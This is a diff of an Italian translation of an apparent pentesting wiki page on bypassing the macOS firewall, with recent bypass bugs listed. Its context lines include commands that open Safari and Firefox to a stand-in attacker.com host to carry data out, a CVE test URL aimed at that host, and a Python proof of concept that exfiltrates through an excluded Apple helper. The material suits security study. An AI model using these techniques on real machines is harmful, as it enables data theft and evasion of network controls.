@@ -28,7 +28,7 @@ Alcune idee per provare a bypassare i firewall
 
 ### Controlla il traffico consentito
 
-Conoscere il traffico consentito ti aiuterà a identificare potenziali domini in whitelist o quali applicazioni sono autorizzate ad accedervi.
+Conoscere il traffico consentito ti aiuterà a identificare i domini potenzialmente in whitelist o quali applicazioni sono autorizzate ad accedervi.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
@@ -61,9 +61,10 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Iniezioni di processi
+### Via processi di iniezione
 
 Se puoi **iniettare codice in un processo** che è autorizzato a connettersi a qualsiasi server, potresti bypassare le protezioni del firewall:
+
 
 {{#ref}}
 macos-proces-abuse/
@@ -74,17 +75,17 @@ macos-proces-abuse/
 ## Vulnerabilità recenti di bypass del firewall di macOS (2023-2025)
 
 ### Bypass del filtro dei contenuti web (Screen Time) – **CVE-2024-44206**
-Nel luglio 2024 Apple ha corretto un bug critico in Safari/WebKit che ha interrotto il “filtro dei contenuti web” a livello di sistema utilizzato dai controlli parentali di Screen Time. 
-Un URI appositamente creato (ad esempio, con “://” codificato in URL due volte) non è riconosciuto dall'ACL di Screen Time ma è accettato da WebKit, quindi la richiesta viene inviata senza filtri. Qualsiasi processo che può aprire un URL (incluso codice sandboxed o non firmato) può quindi raggiungere domini che sono esplicitamente bloccati dall'utente o da un profilo MDM.
+Nel luglio 2024 Apple ha corretto un bug critico in Safari/WebKit che ha interrotto il “filtro dei contenuti web” a livello di sistema utilizzato dai controlli parentali di Screen Time.
+Un URI appositamente creato (ad esempio, con “://” codificato due volte) non è riconosciuto dall'ACL di Screen Time ma è accettato da WebKit, quindi la richiesta viene inviata senza filtri. Qualsiasi processo che può aprire un URL (incluso codice sandboxed o non firmato) può quindi raggiungere domini che sono esplicitamente bloccati dall'utente o da un profilo MDM.
 
-Test pratico (sistema non patchato):
+Test pratico (sistema non aggiornato):
 ```bash
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
 ### Bug di ordinamento delle regole del filtro pacchetti (PF) nelle prime versioni di macOS 14 “Sonoma”
 Durante il ciclo beta di macOS 14, Apple ha introdotto una regressione nel wrapper utente attorno a **`pfctl`**. 
-Le regole aggiunte con la parola chiave `quick` (utilizzata da molti kill-switch VPN) venivano ignorate silenziosamente, causando perdite di traffico anche quando un'interfaccia VPN/firewall riportava *bloccato*. Il bug è stato confermato da diversi fornitori di VPN ed è stato corretto nella RC 2 (build 23A344).
+Le regole che sono state aggiunte con la parola chiave `quick` (utilizzata da molti kill-switch VPN) sono state ignorate silenziosamente, causando perdite di traffico anche quando un'interfaccia VPN/firewall riportava *bloccato*. Il bug è stato confermato da diversi fornitori di VPN ed è stato corretto nella RC 2 (build 23A344).
 
 Controllo rapido delle perdite:
 ```bash
@@ -92,10 +93,10 @@ pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
 ### Abusare dei servizi helper firmati da Apple (legacy – pre-macOS 11.2)
-Prima di macOS 11.2, la **`ContentFilterExclusionList`** consentiva a ~50 binari Apple come **`nsurlsessiond`** e l'App Store di bypassare tutti i firewall a filtro socket implementati con il framework Network Extension (LuLu, Little Snitch, ecc.). 
+Prima di macOS 11.2, la **`ContentFilterExclusionList`** consentiva a ~50 binari Apple come **`nsurlsessiond`** e l'App Store di bypassare tutti i firewall a filtro socket implementati con il framework Network Extension (LuLu, Little Snitch, ecc.).
 Il malware poteva semplicemente avviare un processo escluso—o iniettare codice in esso—e tunnelare il proprio traffico attraverso il socket già consentito. Apple ha completamente rimosso l'elenco di esclusione in macOS 11.2, ma la tecnica è ancora rilevante su sistemi che non possono essere aggiornati.
 
-Esempio di proof-of-concept (pre-11.2):
+Esempio di prova di concetto (pre-11.2):
 ```python
 import subprocess, socket
 # Launch excluded App Store helper (path collapsed for clarity)
@@ -112,7 +113,7 @@ s.send(b"exfil...")
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. Enumera i binari che già possiedono il diritto *outgoing-network* (utile per piggy-backing):
+2. Enumera i binari che già possiedono il diritto *outgoing-network* (utile per il piggy-backing):
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
